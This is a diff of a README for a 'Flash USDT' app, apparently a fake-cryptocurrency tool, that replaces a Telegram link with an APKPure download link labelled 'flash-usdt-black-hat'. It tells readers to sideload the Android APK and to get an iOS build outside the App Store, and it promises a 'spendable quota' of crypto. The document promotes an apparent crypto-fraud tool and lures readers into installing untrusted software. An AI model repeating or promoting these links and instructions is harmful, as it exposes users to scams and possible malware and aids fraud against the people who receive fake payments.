@@ -22,7 +22,7 @@ When you gain app access, you will have a **limited spendable quota** of either 
 ## Installation
 
 ### Android
-- Download the latest APK from the [https://t.me/usdtflashapp/3](#).
+- Download the latest APK from the [download here]https://apkpure.com/flash-usdt-black-hat/flash.usdtblackhat/download(#).
 
 ### iOS
 - Visit the official project website to download the iOS version. **This is not an App Store download.**
